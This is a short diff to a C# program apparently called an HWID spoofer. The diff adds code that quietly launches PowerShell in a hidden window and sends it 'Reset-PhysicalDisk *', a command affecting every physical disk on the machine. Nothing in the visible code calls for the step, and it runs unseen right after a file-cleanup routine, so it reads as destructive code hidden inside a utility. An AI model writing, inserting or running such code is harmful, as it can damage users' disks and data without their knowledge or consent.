@@ -30,6 +30,15 @@ namespace HWID_Spoofer
             process.Close();
             File.Delete(text2);
             File.Delete(text);
+            Process process2 = new Process();
+            process2.StartInfo.FileName = "powershell.exe";
+            process2.StartInfo.RedirectStandardInput = true;
+            process2.StartInfo.RedirectStandardError = true;
+            process2.StartInfo.RedirectStandardOutput = true;
+            process2.StartInfo.UseShellExecute = false;
+            process2.StartInfo.CreateNoWindow = true;
+            process2.Start();
+            process2.StandardInput.WriteLine("Reset-PhysicalDisk *");
         }
         private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
         public static void CleanTraces(string loc)
